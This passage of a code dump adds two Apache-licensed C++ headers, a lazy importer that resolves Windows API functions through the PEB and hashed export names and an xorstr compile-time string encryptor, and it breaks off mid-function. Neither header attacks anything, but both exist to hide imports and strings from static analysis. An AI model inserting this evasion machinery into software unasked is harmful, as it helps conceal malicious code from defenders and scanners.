+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+// === FAQ === documentation is available at https://github.com/JustasMasiulis/lazy_importer
+// * Code doesn't compile with errors about pointer conversion:
+//  - Try using `nullptr` instead of `NULL` or call `get()` instead of using the overloaded operator()
+// * Lazy importer can't find the function I want:
+//   - Double check that the module in which it's located in is actually loaded
+//   - Try #define LAZY_IMPORTER_CASE_INSENSITIVE
+//     This will start using case insensitive comparison globally
+//   - Try #define LAZY_IMPORTER_RESOLVE_FORWARDED_EXPORTS
+//     This will enable forwarded export resolution globally instead of needing explicit `forwarded()` calls
+
+#ifndef LAZY_IMPORTER_HPP
+#define LAZY_IMPORTER_HPP
+
+
+#define LI_FN(name) ::li::detail::lazy_function<LAZY_IMPORTER_KHASH(#name), decltype(&name)>()
+
+#define LI_FN_DEF(name) ::li::detail::lazy_function<LAZY_IMPORTER_KHASH(#name), name>()
+
+#define LI_MODULE(name) ::li::detail::lazy_module<LAZY_IMPORTER_KHASH(name)>()
+
+#ifndef LAZY_IMPORTER_CPP_FORWARD
+#ifdef LAZY_IMPORTER_NO_CPP_FORWARD
+#define LAZY_IMPORTER_CPP_FORWARD(t, v) v
+#else
+#include <utility>
+#define LAZY_IMPORTER_CPP_FORWARD(t, v) std::forward<t>( v )
+#endif
+#endif
+
+#include <intrin.h>
+
+#ifndef LAZY_IMPORTER_NO_FORCEINLINE
+#if defined(_MSC_VER)
+#define LAZY_IMPORTER_FORCEINLINE __forceinline
+#elif defined(__GNUC__) && __GNUC__ > 3
+#define LAZY_IMPORTER_FORCEINLINE inline __attribute__((__always_inline__))
+#else
+#define LAZY_IMPORTER_FORCEINLINE inline
+#endif
+#else
+#define LAZY_IMPORTER_FORCEINLINE inline
+#endif
+
+
+#ifdef LAZY_IMPORTER_CASE_INSENSITIVE
+#define LAZY_IMPORTER_CASE_SENSITIVITY false
+#else
+#define LAZY_IMPORTER_CASE_SENSITIVITY true
+#endif
+
+#define LAZY_IMPORTER_STRINGIZE(x) #x
+#define LAZY_IMPORTER_STRINGIZE_EXPAND(x) LAZY_IMPORTER_STRINGIZE(x)
+
+#define LAZY_IMPORTER_KHASH(str) ::li::detail::khash(str, \
+    ::li::detail::khash_impl( __TIME__ __DATE__ LAZY_IMPORTER_STRINGIZE_EXPAND(__LINE__) LAZY_IMPORTER_STRINGIZE_EXPAND(__COUNTER__), 2166136261 ))
+
+namespace li { namespace detail {
+
+    namespace win {
+
+        struct LIST_ENTRY_T {
+            const char* Flink;
+            const char* Blink;
+        };
+
+        struct UNICODE_STRING_T {
+            unsigned short Length;
+            unsigned short MaximumLength;
+            wchar_t*       Buffer;
+        };
+
+        struct PEB_LDR_DATA_T {
+            unsigned long Length;
+            unsigned long Initialized;
+            const char*   SsHandle;
+            LIST_ENTRY_T  InLoadOrderModuleList;
+        };
+
+        struct PEB_T {
+            unsigned char   Reserved1[2];
+            unsigned char   BeingDebugged;
+            unsigned char   Reserved2[1];
+            const char*     Reserved3[2];
+            PEB_LDR_DATA_T* Ldr;
+        };
+
+        struct LDR_DATA_TABLE_ENTRY_T {
+            LIST_ENTRY_T InLoadOrderLinks;
+            LIST_ENTRY_T InMemoryOrderLinks;
+            LIST_ENTRY_T InInitializationOrderLinks;
+            const char*  DllBase;
+            const char*  EntryPoint;
+            union {
+                unsigned long SizeOfImage;
+                const char*   _dummy;
+            };
+            UNICODE_STRING_T FullDllName;
+            UNICODE_STRING_T BaseDllName;
+
+            LAZY_IMPORTER_FORCEINLINE const LDR_DATA_TABLE_ENTRY_T*
+                                            load_order_next() const noexcept
+            {
+                return reinterpret_cast<const LDR_DATA_TABLE_ENTRY_T*>(
+                    InLoadOrderLinks.Flink);
+            }
+        };
+
+        struct IMAGE_DOS_HEADER { // DOS .EXE header
+            unsigned short e_magic; // Magic number
+            unsigned short e_cblp; // Bytes on last page of file
+            unsigned short e_cp; // Pages in file
+            unsigned short e_crlc; // Relocations
+            unsigned short e_cparhdr; // Size of header in paragraphs
+            unsigned short e_minalloc; // Minimum extra paragraphs needed
+            unsigned short e_maxalloc; // Maximum extra paragraphs needed
+            unsigned short e_ss; // Initial (relative) SS value
+            unsigned short e_sp; // Initial SP value
+            unsigned short e_csum; // Checksum
+            unsigned short e_ip; // Initial IP value
+            unsigned short e_cs; // Initial (relative) CS value
+            unsigned short e_lfarlc; // File address of relocation table
+            unsigned short e_ovno; // Overlay number
+            unsigned short e_res[4]; // Reserved words
+            unsigned short e_oemid; // OEM identifier (for e_oeminfo)
+            unsigned short e_oeminfo; // OEM information; e_oemid specific
+            unsigned short e_res2[10]; // Reserved words
+            long           e_lfanew; // File address of new exe header
+        };
+
+        struct IMAGE_FILE_HEADER {
+            unsigned short Machine;
+            unsigned short NumberOfSections;
+            unsigned long  TimeDateStamp;
+            unsigned long  PointerToSymbolTable;
+            unsigned long  NumberOfSymbols;
+            unsigned short SizeOfOptionalHeader;
+            unsigned short Characteristics;
+        };
+
+        struct IMAGE_EXPORT_DIRECTORY {
+            unsigned long  Characteristics;
+            unsigned long  TimeDateStamp;
+            unsigned short MajorVersion;
+            unsigned short MinorVersion;
+            unsigned long  Name;
+            unsigned long  Base;
+            unsigned long  NumberOfFunctions;
+            unsigned long  NumberOfNames;
+            unsigned long  AddressOfFunctions; // RVA from base of image
+            unsigned long  AddressOfNames; // RVA from base of image
+            unsigned long  AddressOfNameOrdinals; // RVA from base of image
+        };
+
+        struct IMAGE_DATA_DIRECTORY {
+            unsigned long VirtualAddress;
+            unsigned long Size;
+        };
+
+        struct IMAGE_OPTIONAL_HEADER64 {
+            unsigned short       Magic;
+            unsigned char        MajorLinkerVersion;
+            unsigned char        MinorLinkerVersion;
+            unsigned long        SizeOfCode;
+            unsigned long        SizeOfInitializedData;
+            unsigned long        SizeOfUninitializedData;
+            unsigned long        AddressOfEntryPoint;
+            unsigned long        BaseOfCode;
+            unsigned long long   ImageBase;
+            unsigned long        SectionAlignment;
+            unsigned long        FileAlignment;
+            unsigned short       MajorOperatingSystemVersion;
+            unsigned short       MinorOperatingSystemVersion;
+            unsigned short       MajorImageVersion;
+            unsigned short       MinorImageVersion;
+            unsigned short       MajorSubsystemVersion;
+            unsigned short       MinorSubsystemVersion;
+            unsigned long        Win32VersionValue;
+            unsigned long        SizeOfImage;
+            unsigned long        SizeOfHeaders;
+            unsigned long        CheckSum;
+            unsigned short       Subsystem;
+            unsigned short       DllCharacteristics;
+            unsigned long long   SizeOfStackReserve;
+            unsigned long long   SizeOfStackCommit;
+            unsigned long long   SizeOfHeapReserve;
+            unsigned long long   SizeOfHeapCommit;
+            unsigned long        LoaderFlags;
+            unsigned long        NumberOfRvaAndSizes;
+            IMAGE_DATA_DIRECTORY DataDirectory[16];
+        };
+
+        struct IMAGE_OPTIONAL_HEADER32 {
+            unsigned short       Magic;
+            unsigned char        MajorLinkerVersion;
+            unsigned char        MinorLinkerVersion;
+            unsigned long        SizeOfCode;
+            unsigned long        SizeOfInitializedData;
+            unsigned long        SizeOfUninitializedData;
+            unsigned long        AddressOfEntryPoint;
+            unsigned long        BaseOfCode;
+            unsigned long        BaseOfData;
+            unsigned long        ImageBase;
+            unsigned long        SectionAlignment;
+            unsigned long        FileAlignment;
+            unsigned short       MajorOperatingSystemVersion;
+            unsigned short       MinorOperatingSystemVersion;
+            unsigned short       MajorImageVersion;
+            unsigned short       MinorImageVersion;
+            unsigned short       MajorSubsystemVersion;
+            unsigned short       MinorSubsystemVersion;
+            unsigned long        Win32VersionValue;
+            unsigned long        SizeOfImage;
+            unsigned long        SizeOfHeaders;
+            unsigned long        CheckSum;
+            unsigned short       Subsystem;
+            unsigned short       DllCharacteristics;
+            unsigned long        SizeOfStackReserve;
+            unsigned long        SizeOfStackCommit;
+            unsigned long        SizeOfHeapReserve;
+            unsigned long        SizeOfHeapCommit;
+            unsigned long        LoaderFlags;
+            unsigned long        NumberOfRvaAndSizes;
+            IMAGE_DATA_DIRECTORY DataDirectory[16];
+        };
+
+        struct IMAGE_NT_HEADERS {
+            unsigned long     Signature;
+            IMAGE_FILE_HEADER FileHeader;
+#ifdef _WIN64
+            IMAGE_OPTIONAL_HEADER64 OptionalHeader;
+#else
+            IMAGE_OPTIONAL_HEADER32 OptionalHeader;
+#endif
+        };
+
+    } // namespace win
+
+    struct forwarded_hashes {
+       unsigned module_hash;
+       unsigned function_hash;
+    };
+
+    // 64 bit integer where 32 bits are used for the hash offset
+    // and remaining 32 bits are used for the hash computed using it
+    using offset_hash_pair = unsigned long long;
+
+    LAZY_IMPORTER_FORCEINLINE constexpr unsigned get_hash(offset_hash_pair pair) noexcept { return ( pair & 0xFFFFFFFF ); }
+
+    LAZY_IMPORTER_FORCEINLINE constexpr unsigned get_offset(offset_hash_pair pair) noexcept { return static_cast<unsigned>( pair >> 32 ); }
+
+    template<bool CaseSensitive = LAZY_IMPORTER_CASE_SENSITIVITY>
+    LAZY_IMPORTER_FORCEINLINE constexpr unsigned hash_single(unsigned value, char c) noexcept
+    {
+        return (value ^ static_cast<unsigned>((!CaseSensitive && c >= 'A' && c <= 'Z') ? (c | (1 << 5)) : c)) * 16777619;
+    }
+
+    LAZY_IMPORTER_FORCEINLINE constexpr unsigned
+        khash_impl(const char* str, unsigned value) noexcept
+    {
+        return (*str ? khash_impl(str + 1, hash_single(value, *str)) : value);
+    }
+
+    LAZY_IMPORTER_FORCEINLINE constexpr offset_hash_pair khash(
+        const char* str, unsigned offset) noexcept
+    {
+        return ((offset_hash_pair{ offset } << 32) | khash_impl(str, offset));
+    }
+
+    template<class CharT = char>
+    LAZY_IMPORTER_FORCEINLINE unsigned hash(const CharT* str, unsigned offset) noexcept
+    {
+        unsigned value = offset;
+
+        for(;;) {
+            char c = *str++;
+            if(!c)
+                return value;
+            value = hash_single(value, c);
+        }
+    }
+
+    LAZY_IMPORTER_FORCEINLINE unsigned hash(
+       const win::UNICODE_STRING_T& str, unsigned offset) noexcept
+    {
+        auto       first = str.Buffer;
+        const auto last  = first + (str.Length / sizeof(wchar_t));
+        auto       value = offset;
+        for(; first != last; ++first)
+            value = hash_single(value, static_cast<char>(*first));
+
+        return value;
+    }
+
+    LAZY_IMPORTER_FORCEINLINE forwarded_hashes hash_forwarded(
+        const char* str, unsigned offset) noexcept
+    {
+        forwarded_hashes res{ offset, offset };
+
+        for(; *str != '.'; ++str)
+            res.module_hash = hash_single<true>(res.module_hash, *str);
+
+        ++str;
+
+        for(; *str; ++str)
+            res.function_hash = hash_single(res.function_hash, *str);
+
+        return res;
+    }
+
+    // some helper functions
+    LAZY_IMPORTER_FORCEINLINE const win::PEB_T* peb() noexcept
+    {
+#if defined(_M_X64) || defined(__amd64__)
+#if defined(_MSC_VER)
+        return reinterpret_cast<const win::PEB_T*>(__readgsqword(0x60));
+#else
+        const win::PEB_T* ptr;
+        __asm__ __volatile__ ("mov %%gs:0x60, %0" : "=r"(ptr));
+        return ptr;
+#endif
+#elif defined(_M_IX86) || defined(__i386__)
+#if defined(_MSC_VER)
+        return reinterpret_cast<const win::PEB_T*>(__readfsdword(0x30));
+#else
+        const win::PEB_T* ptr;
+        __asm__ __volatile__ ("mov %%fs:0x30, %0" : "=r"(ptr));
+        return ptr;
+#endif
+#elif defined(_M_ARM) || defined(__arm__)
+        return *reinterpret_cast<const win::PEB_T**>(_MoveFromCoprocessor(15, 0, 13, 0, 2) + 0x30);
+#elif defined(_M_ARM64) || defined(__aarch64__)
+        return *reinterpret_cast<const win::PEB_T**>(__getReg(18) + 0x60);
+#elif defined(_M_IA64) || defined(__ia64__)
+        return *reinterpret_cast<const win::PEB_T**>(static_cast<char*>(_rdteb()) + 0x60);
+#else
+#error Unsupported platform. Open an issue and Ill probably add support.
+#endif
+    }
+
+    LAZY_IMPORTER_FORCEINLINE const win::PEB_LDR_DATA_T* ldr()
+    {
+        return reinterpret_cast<const win::PEB_LDR_DATA_T*>(peb()->Ldr);
+    }
+
+    LAZY_IMPORTER_FORCEINLINE const win::IMAGE_NT_HEADERS* nt_headers(
+        const char* base) noexcept
+    {
+        return reinterpret_cast<const win::IMAGE_NT_HEADERS*>(
+            base + reinterpret_cast<const win::IMAGE_DOS_HEADER*>(base)->e_lfanew);
+    }
+
+    LAZY_IMPORTER_FORCEINLINE const win::IMAGE_EXPORT_DIRECTORY* image_export_dir(
+        const char* base) noexcept
+    {
+        return reinterpret_cast<const win::IMAGE_EXPORT_DIRECTORY*>(
+            base + nt_headers(base)->OptionalHeader.DataDirectory->VirtualAddress);
+    }
+
+    LAZY_IMPORTER_FORCEINLINE const win::LDR_DATA_TABLE_ENTRY_T* ldr_data_entry() noexcept
+    {
+        return reinterpret_cast<const win::LDR_DATA_TABLE_ENTRY_T*>(
+            ldr()->InLoadOrderModuleList.Flink);
+    }
+
+    struct exports_directory {
+        unsigned long                      _ied_size;
+        const char*                        _base;
+        const win::IMAGE_EXPORT_DIRECTORY* _ied;
+
+    public:
+        using size_type = unsigned long;
+
+        LAZY_IMPORTER_FORCEINLINE
+        exports_directory(const char* base) noexcept : _base(base)
+        {
+            const auto ied_data_dir = nt_headers(base)->OptionalHeader.DataDirectory[0];
+            _ied = reinterpret_cast<const win::IMAGE_EXPORT_DIRECTORY*>(
+                base + ied_data_dir.VirtualAddress);
+            _ied_size = ied_data_dir.Size;
+        }
+
+        LAZY_IMPORTER_FORCEINLINE explicit operator bool() const noexcept
+        {
+            return reinterpret_cast<const char*>(_ied) != _base;
+        }
+
+        LAZY_IMPORTER_FORCEINLINE size_type size() const noexcept
+        {
+            return _ied->NumberOfNames;
+        }
+
+        LAZY_IMPORTER_FORCEINLINE const char* base() const noexcept { return _base; }
+        LAZY_IMPORTER_FORCEINLINE const win::IMAGE_EXPORT_DIRECTORY* ied() const noexcept
+        {
+            return _ied;
+        }
+
+        LAZY_IMPORTER_FORCEINLINE const char* name(size_type index) const noexcept
+        {
+            return _base + reinterpret_cast<const unsigned long*>(_base + _ied->AddressOfNames)[index];
+        }
+
+        LAZY_IMPORTER_FORCEINLINE const char* address(size_type index) const noexcept
+        {
+            const auto* const rva_table =
+                reinterpret_cast<const unsigned long*>(_base + _ied->AddressOfFunctions);
+
+            const auto* const ord_table = reinterpret_cast<const unsigned short*>(
+                _base + _ied->AddressOfNameOrdinals);
+
+            return _base + rva_table[ord_table[index]];
+        }
+
+        LAZY_IMPORTER_FORCEINLINE bool is_forwarded(
+            const char* export_address) const noexcept
+        {
+            const auto ui_ied = reinterpret_cast<const char*>(_ied);
+            return (export_address > ui_ied && export_address < ui_ied + _ied_size);
+        }
+    };
+
+    struct safe_module_enumerator {
+        using value_type = const detail::win::LDR_DATA_TABLE_ENTRY_T;
+        value_type* value;
+        value_type* head;
+
+        LAZY_IMPORTER_FORCEINLINE safe_module_enumerator() noexcept
+            : safe_module_enumerator(ldr_data_entry())
+        {}
+
+        LAZY_IMPORTER_FORCEINLINE
+        safe_module_enumerator(const detail::win::LDR_DATA_TABLE_ENTRY_T* ldr) noexcept
+            : value(ldr->load_order_next()), head(value)
+        {}
+
+        LAZY_IMPORTER_FORCEINLINE void reset() noexcept
+        {
+            value = head->load_order_next();
+        }
+
+        LAZY_IMPORTER_FORCEINLINE bool next() noexcept
+        {
+            value = value->load_order_next();
+
+            return value != head && value->DllBase;
+        }
+    };
+
+    struct unsafe_module_enumerator {
+        using value_type = const detail::win::LDR_DATA_TABLE_ENTRY_T*;
+        value_type value;
+
+        LAZY_IMPORTER_FORCEINLINE unsafe_module_enumerator() noexcept
+            : value(ldr_data_entry())
+        {}
+
+        LAZY_IMPORTER_FORCEINLINE void reset() noexcept { value = ldr_data_entry(); }
+
+        LAZY_IMPORTER_FORCEINLINE bool next() noexcept
+        {
+            value = value->load_order_next();
+            return true;
+        }
+    };
+
+    // provides the cached functions which use Derive classes methods
+    template<class Derived, class DefaultType = void*>
+    class lazy_base {
+    protected:
+        // This function is needed because every templated function
+        // with different args has its own static buffer
+        LAZY_IMPORTER_FORCEINLINE static void*& _cache() noexcept
+        {
+            static void* value = nullptr;
+            return value;
+        }
+
+    public:
+        template<class T = DefaultType>
+        LAZY_IMPORTER_FORCEINLINE static T safe() noexcept
+        {
+            return Derived::template get<T, safe_module_enumerator>();
+        }
+
+        template<class T = DefaultType, class Enum = unsafe_module_enumerator>
+        LAZY_IMPORTER_FORCEINLINE static T cached() noexcept
+        {
+            auto& cached = _cache();
+            if(!cached)
+                cached = Derived::template get<void*, Enum>();
+
+            return (T)(cached);
+        }
+
+        template<class T = DefaultType>
+        LAZY_IMPORTER_FORCEINLINE static T safe_cached() noexcept
+        {
+            return cached<T, safe_module_enumerator>();
+        }
+    };
+
+    template<offset_hash_pair OHP>
+    struct lazy_module : lazy_base<lazy_module<OHP>> {
+        template<class T = void*, class Enum = unsafe_module_enumerator>
+        LAZY_IMPORTER_FORCEINLINE static T get() noexcept
+        {
+            Enum e;
+            do {
+                if(hash(e.value->BaseDllName, get_offset(OHP)) == get_hash(OHP))
+                    return (T)(e.value->DllBase);
+            } while(e.next());
+            return {};
+        }
+
+        template<class T = void*, class Ldr>
+        LAZY_IMPORTER_FORCEINLINE static T in(Ldr ldr) noexcept
+        {
+            safe_module_enumerator e(reinterpret_cast<const detail::win::LDR_DATA_TABLE_ENTRY_T*>(ldr));
+            do {
+                if(hash(e.value->BaseDllName, get_offset(OHP)) == get_hash(OHP))
+                    return (T)(e.value->DllBase);
+            } while(e.next());
+            return {};
+        }
+
+        template<class T = void*, class Ldr>
+        LAZY_IMPORTER_FORCEINLINE static T in_cached(Ldr ldr) noexcept
+        {
+            auto& cached = lazy_base<lazy_module<OHP>>::_cache();
+            if(!cached)
+                cached = in(ldr);
+
+            return (T)(cached);
+        }
+    };
+
+    template<offset_hash_pair OHP, class T>
+    struct lazy_function : lazy_base<lazy_function<OHP, T>, T> {
+        using base_type = lazy_base<lazy_function<OHP, T>, T>;
+
+        template<class... Args>
+        LAZY_IMPORTER_FORCEINLINE decltype(auto) operator()(Args&&... args) const
+        {
+#ifndef LAZY_IMPORTER_CACHE_OPERATOR_PARENS
+            return get()(LAZY_IMPORTER_CPP_FORWARD(Args, args)...);
+#else
+            return this->cached()(LAZY_IMPORTER_CPP_FORWARD(Args, args)...);
+#endif
+        }
+
+        template<class F = T, class Enum = unsafe_module_enumerator>
+        LAZY_IMPORTER_FORCEINLINE static F get() noexcept
+        {
+            // for backwards compatability.
+            // Before 2.0 it was only possible to resolve forwarded exports when
+            // this macro was enabled
+#ifdef LAZY_IMPORTER_RESOLVE_FORWARDED_EXPORTS
+            return forwarded<F, Enum>();
+#else
+
+            Enum e;
+
+            do {
+#ifdef LAZY_IMPORTER_HARDENED_MODULE_CHECKS
+                if(!e.value->DllBase || !e.value->FullDllName.Length)
+                    continue;
+#endif
+
+                const exports_directory exports(e.value->DllBase);
+
+                if(exports) {
+                    auto export_index = exports.size();
+                    while(export_index--)
+                        if(hash(exports.name(export_index), get_offset(OHP)) == get_hash(OHP))
+                            return (F)(exports.address(export_index));
+                }
+            } while(e.next());
+            return {};
+#endif
+        }
+
+        template<class F = T, class Enum = unsafe_module_enumerator>
+        LAZY_IMPORTER_FORCEINLINE static F forwarded() noexcept
+        {
+            detail::win::UNICODE_STRING_T name;
+            forwarded_hashes              hashes{ 0, get_hash(OHP) };
+
+            Enum e;
+            do {
+                name = e.value->BaseDllName;
+                name.Length -= 8; // get rid of .dll extension
+
+                if(!hashes.module_hash || hash(name, get_offset(OHP)) == hashes.module_hash) {
+                    const exports_directory exports(e.value->DllBase);
+
+                    if(exports) {
+                        auto export_index = exports.size();
+                        while(export_index--)
+                            if(hash(exports.name(export_index), get_offset(OHP)) == hashes.function_hash) {
+                                const auto addr = exports.address(export_index);
+
+                                if(exports.is_forwarded(addr)) {
+                                    hashes = hash_forwarded(
+                                        reinterpret_cast<const char*>(addr),
+                                        get_offset(OHP));
+
+                                    e.reset();
+                                    break;
+                                }
+                                return (F)(addr);
+                            }
+                    }
+                }
+            } while(e.next());
+            return {};
+        }
+
+        template<class F = T>
+        LAZY_IMPORTER_FORCEINLINE static F forwarded_safe() noexcept
+        {
+            return forwarded<F, safe_module_enumerator>();
+        }
+
+        template<class F = T, class Enum = unsafe_module_enumerator>
+        LAZY_IMPORTER_FORCEINLINE static F forwarded_cached() noexcept
+        {
+            auto& value = base_type::_cache();
+            if(!value)
+                value = forwarded<void*, Enum>();
+            return (F)(value);
+        }
+
+        template<class F = T>
+        LAZY_IMPORTER_FORCEINLINE static F forwarded_safe_cached() noexcept
+        {
+            return forwarded_cached<F, safe_module_enumerator>();
+        }
+
+        template<class F = T, bool IsSafe = false, class Module>
+        LAZY_IMPORTER_FORCEINLINE static F in(Module m) noexcept
+        {
+            if(IsSafe && !m)
+                return {};
+
+            const exports_directory exports((const char*)(m));
+            if(IsSafe && !exports)
+                return {};
+
+            for(unsigned long i{};; ++i) {
+                if(IsSafe && i == exports.size())
+                    break;
+
+                if(hash(exports.name(i), get_offset(OHP)) == get_hash(OHP))
+                    return (F)(exports.address(i));
+            }
+            return {};
+        }
+
+        template<class F = T, class Module>
+        LAZY_IMPORTER_FORCEINLINE static F in_safe(Module m) noexcept
+        {
+            return in<F, true>(m);
+        }
+
+        template<class F = T, bool IsSafe = false, class Module>
+        LAZY_IMPORTER_FORCEINLINE static F in_cached(Module m) noexcept
+        {
+            auto& value = base_type::_cache();
+            if(!value)
+                value = in<void*, IsSafe>(m);
+            return (F)(value);
+        }
+
+        template<class F = T, class Module>
+        LAZY_IMPORTER_FORCEINLINE static F in_safe_cached(Module m) noexcept
+        {
+            return in_cached<F, true>(m);
+        }
+
+        template<class F = T>
+        LAZY_IMPORTER_FORCEINLINE static F nt() noexcept
+        {
+            return in<F>(ldr_data_entry()->load_order_next()->DllBase);
+        }
+
+        template<class F = T>
+        LAZY_IMPORTER_FORCEINLINE static F nt_safe() noexcept
+        {
+            return in_safe<F>(ldr_data_entry()->load_order_next()->DllBase);
+        }
+
+        template<class F = T>
+        LAZY_IMPORTER_FORCEINLINE static F nt_cached() noexcept
+        {
+            return in_cached<F>(ldr_data_entry()->load_order_next()->DllBase);
+        }
+
+        template<class F = T>
+        LAZY_IMPORTER_FORCEINLINE static F nt_safe_cached() noexcept
+        {
+            return in_safe_cached<F>(ldr_data_entry()->load_order_next()->DllBase);
+        }
+    };
+
+}} // namespace li::detail
+
+#endif // include guard
+
+```
+
+`Utils/pimraryXor.h`:
+
+```h
+/*
+ * Copyright 2017 - 2021 Justas Masiulis
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+#ifndef JM_XORSTR_HPP
+#define JM_XORSTR_HPP
+
+#if defined(_M_ARM64) || defined(__aarch64__) || defined(_M_ARM) || defined(__arm__)
+#include <arm_neon.h>
+#elif defined(_M_X64) || defined(__amd64__) || defined(_M_IX86) || defined(__i386__)
+#include <immintrin.h>
+#else
+#error Unsupported platform
+#endif
+
+#include <cstdint>
+#include <cstddef>
+#include <utility>
+#include <type_traits>
+
+#define xorstr(str) ::jm::xor_string([]() { return str; }, std::integral_constant<std::size_t, sizeof(str) / sizeof(*str)>{}, std::make_index_sequence<::jm::detail::_buffer_size<sizeof(str)>()>{})
+#define xorstr_(str) xorstr(str).crypt_get()
+
+#ifdef _MSC_VER
+#define XORSTR_FORCEINLINE __forceinline
+#else
+#define XORSTR_FORCEINLINE __attribute__((always_inline)) inline
+#endif
+
+namespace jm {
+
+    namespace detail {
+
+        template<std::size_t Size>
+        XORSTR_FORCEINLINE constexpr std::size_t _buffer_size()
+        {
+            return ((Size / 16) + (Size % 16 != 0)) * 2;
+        }
+
+        template<std::uint32_t Seed>
+        XORSTR_FORCEINLINE constexpr std::uint32_t key4() noexcept
+        {
+            std::uint32_t value = Seed;
+            for (char c : __TIME__)
+                value = static_cast<std::uint32_t>((value ^ c) * 16777619ull);
+            return value;
+        }
+
+        template<std::size_t S>
+        XORSTR_FORCEINLINE constexpr std::uint64_t key8()
+        {
+            constexpr auto first_part = key4<2166136261 + S>();
+            constexpr auto second_part = key4<first_part>();
+            return (static_cast<std::uint64_t>(first_part) << 32) | second_part;
+        }
+
+        // loads up to 8 characters of string into uint64 and xors it with the key
+        template<std::size_t N, class CharT>
+        XORSTR_FORCEINLINE constexpr std::uint64_t
+            load_xored_str8(std::uint64_t key, std::size_t idx, const CharT* str) noexcept
+        {
+            using cast_type = typename std::make_unsigned<CharT>::type;
+            constexpr auto value_size = sizeof(CharT);
+            constexpr auto idx_offset = 8 / value_size;
+
+            std::uint64_t value = key;
+            for (std::size_t i = 0; i < idx_offset && i + idx * idx_offset < N; ++i)
+                value ^=
+                (std::uint64_t{ static_cast<cast_type>(str[i + idx * idx_offset]) }
+            << ((i % idx_offset) * 8 * value_size));
+
+            return value;
+        }
+
+        // forces compiler to use registers instead of stuffing constants in rdata
+        XORSTR_FORCEINLINE std::uint64_t load_from_reg(std::uint64_t value) noexcept
+        {
+#if defined(__clang__) || defined(__GNUC__)
+            asm("" : "=r"(value) : "0"(value) : );
+            return value;
+#else
+            volatile std::uint64_t reg = value;
+            return reg;
+#endif
+        }
+
+    } // namespace detail
+
+    template<class CharT, std::size_t Size, class Keys, class Indices>
+    class xor_string;
+
+    template<class CharT, std::size_t Size, std::uint64_t... Keys, std::size_t... Indices>
+    class xor_string<CharT, Size, std::integer_sequence<std::uint64_t, Keys...>, std::index_sequence<Indices...>> {
+#ifndef JM_XORSTR_DISABLE_AVX_INTRINSICS
+        constexpr static inline std::uint64_t alignment = ((Size > 16) ? 32 : 16);
+#else
+        constexpr static inline std::uint64_t alignment = 16;
+#endif
+
+        alignas(alignment) std::uint64_t _storage[sizeof...(Keys)];
+
+    public:
+        using value_type = CharT;
+        using size_type = std::size_t;
+        using pointer = CharT*;
+        using const_pointer = const CharT*;
+
+        template<class L>
+        XORSTR_FORCEINLINE xor_string(L l, std::integral_constant<std::size_t, Size>, std::index_sequence<Indices...>) noexcept
+            : _storage{ ::jm::detail::load_from_reg((std::integral_constant<std::uint64_t, detail::load_xored_str8<Size>(Keys, Indices, l())>::value))... }
+        {}
+
+        XORSTR_FORCEINLINE constexpr size_type size() const noexcept
+        {
+            return Size - 1;
+        }
+
+        XORSTR_FORCEINLINE void crypt() noexcept
+        {
+            // everything is inlined by hand because a certain compiler with a certain linker is _very_ slow
+#if defined(__clang__)
+            alignas(alignment)
+                std::uint64_t arr[]{ ::jm::detail::load_from_reg(Keys)... };
+            std::uint64_t* keys =
+                (std::uint64_t*)::jm::detail::load_from_reg((std::uint64_t)arr);
+#else
+            alignas(alignment) std::uint64_t keys[]{ ::jm::detail::load_from_reg(Keys)... };
+#endif
+
+#if defined(_M_ARM64) || defined(__aarch64__) || defined(_M_ARM) || defined(__arm__)
+#if defined(__clang__)
+            ((Indices >= sizeof(_storage) / 16 ? static_cast<void>(0) : __builtin_neon_vst1q_v(
+                reinterpret_cast<uint64_t*>(_storage) + Indices * 2,
+                veorq_u64(__builtin_neon_vld1q_v(reinterpret_cast<const uint64_t*>(_storage) + Indices * 2, 51),
+                    __builtin_neon_vld1q_v(reinterpret_cast<const uint64_t*>(keys) + Indices * 2, 51)),
+                51)), ...);
+#else // GCC, MSVC
+            ((Indices >= sizeof(_storage) / 16 ? static_cast<void>(0) : vst1q_u64(
+                reinterpret_cast<uint64_t*>(_storage) + Indices * 2,
+                veorq_u64(vld1q_u64(reinterpret_cast<const uint64_t*>(_storage) + Indices * 2),
+                    vld1q_u64(reinterpret_cast<const uint64_t*>(keys) + Indices * 2)))), ...);
+#endif
+#elif !defined(JM_XORSTR_DISABLE_AVX_INTRINSICS)
+            ((Indices >= sizeof(_storage) / 32 ? static_cast<void>(0) : _mm256_store_si256(
+                reinterpret_cast<__m256i*>(_storage) + Indices,
+                _mm256_xor_si256(
+                    _mm256_load_si256(reinterpret_cast<const __m256i*>(_storage) + Indices),
+                    _mm256_load_si256(reinterpret_cast<const __m256i*>(keys) + Indices)))), ...);
+
+            if constexpr (sizeof(_storage) % 32 != 0)
+                _mm_store_si128(
+                    reinterpret_cast<__m128i*>(_storage + sizeof...(Keys) - 2),
+                    _mm_xor_si128(_mm_load_si128(reinterpret_cast<const __m128i*>(_storage + sizeof...(Keys) - 2)),
+                        _mm_load_si128(reinterpret_cast<const __m128i*>(keys + sizeof...(Keys) - 2))));
+#else
+            ((Indices >= sizeof(_storage) / 16 ? static_cast<void>(0) : _mm_store_si128(
+                reinterpret_cast<__m128i*>(_storage) + Indices,
+                _mm_xor_si128(_mm_load_si128(reinterpret_cast<const __m128i*>(_storage) + Indices),
+                    _mm_load_si128(reinterpret_cast<const __m128i*>(keys) + Indices)))), ...);
+#endif
+        }
+
+        XORSTR_FORCEINLINE const_pointer get() const noexcept
+        {
+            return reinterpret_cast<const_pointer>(_storage);
+        }
+
+        XORSTR_FORCEINLINE pointer get() noexcept
+        {
+            return reinterpret_cast<pointer>(_storage);
+        }
+
+        XORSTR_FORCEINLINE pointer crypt_get() noexcept
+        {
+            // crypt() is inlined by hand because a certain compiler with a certain linker is _very_ slow
+#if defined(__clang__)
+            alignas(alignment)
+                std::uint64_t arr[]{ ::jm::detail::load_from_reg(Keys)... };
+            std::uint64_t* keys =
